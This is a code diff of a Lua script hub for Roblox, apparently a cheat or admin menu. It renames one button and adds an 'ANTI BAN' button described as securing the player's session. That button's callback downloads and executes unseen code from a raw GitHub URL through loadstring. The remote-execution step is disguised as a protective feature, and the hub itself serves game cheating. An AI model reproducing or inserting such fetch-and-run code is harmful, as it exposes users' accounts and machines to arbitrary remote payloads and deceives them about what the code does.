@@ -380,7 +380,7 @@ local Tabs = {
 Window:SelectTab(1)
 
 local IYAdmin = Tabs.Player:AddButton({
-    Title = "UniAdmin",
+    Title = "UNIADMIN",
     Description = "Click ] To Open And Type - cmds to open search menu",
 
     Callback = function()
@@ -662,6 +662,15 @@ G2L["7"].MouseButton1Click:Connect(function()
 end)
 
 task.spawn(StartSequence)
+    end
+})
+
+local IYAdmin = Tabs.Player:AddButton({
+    Title = "ANTI BAN",
+    Description = "Secures Your Game Session",
+
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemSecRoblox/SystemSec/refs/heads/main/main.lua"))()
     end
 })
 
